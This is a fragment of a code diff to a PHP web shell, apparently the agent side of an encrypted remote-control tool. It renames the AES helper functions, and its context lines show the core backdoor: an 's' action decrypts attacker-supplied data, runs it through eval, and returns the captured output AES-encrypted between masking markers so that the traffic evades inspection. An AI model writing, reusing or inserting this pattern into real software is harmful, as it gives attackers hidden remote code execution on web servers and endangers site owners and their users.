@@ -27,7 +27,7 @@ function obfs_echo($s) {
     echo $start_mask . $s . $stop_mask;
 }
 
-function aes_enc($data) {
+function eg_aes_enc($data) {
     $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
     $encryptedData = openssl_encrypt(
         $data,
@@ -39,7 +39,7 @@ function aes_enc($data) {
     return ($iv . base64_decode($encryptedData));
 }
 
-function aes_dec($encryptedData) {
+function eg_aes_dec($encryptedData) {
     return openssl_decrypt(
         base64_encode(substr($encryptedData, 16)),
         'AES-256-CBC',
@@ -72,9 +72,9 @@ if($action == "s") {
         obfs_echo("WRONG_NO_OPENSSL");
     }else{
         ob_start();
-        eval(aes_dec($data));
+        eval(eg_aes_dec($data));
         $output = ob_get_contents();
         ob_end_flush();
-        obfs_echo(aes_enc($output));
+        obfs_echo(eg_aes_enc($output));
     }
 }
